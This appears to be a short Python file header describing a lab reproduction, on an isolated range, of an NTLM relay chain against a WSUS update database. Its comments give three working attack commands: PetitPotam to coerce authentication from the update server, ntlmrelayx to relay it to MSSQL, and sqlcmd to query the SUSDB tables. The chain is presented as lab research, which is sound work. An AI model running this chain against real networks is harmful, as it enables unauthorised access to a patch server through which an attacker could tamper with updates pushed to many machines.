"""Lab reproduction of the WSUS update-database relay chain (isolated range)."""
# Coerce authentication from the update server:
#   python3 PetitPotam.py 10.0.0.9 10.0.0.5
# Relay it to the update database:
#   ntlmrelayx.py -t mssql://10.0.0.9 -smb2support
# Open a session on the SUSDB with the SQL client:
#   sqlcmd -S 10.0.0.9 -E -Q "USE SUSDB; SELECT revision FROM tbUpdate"
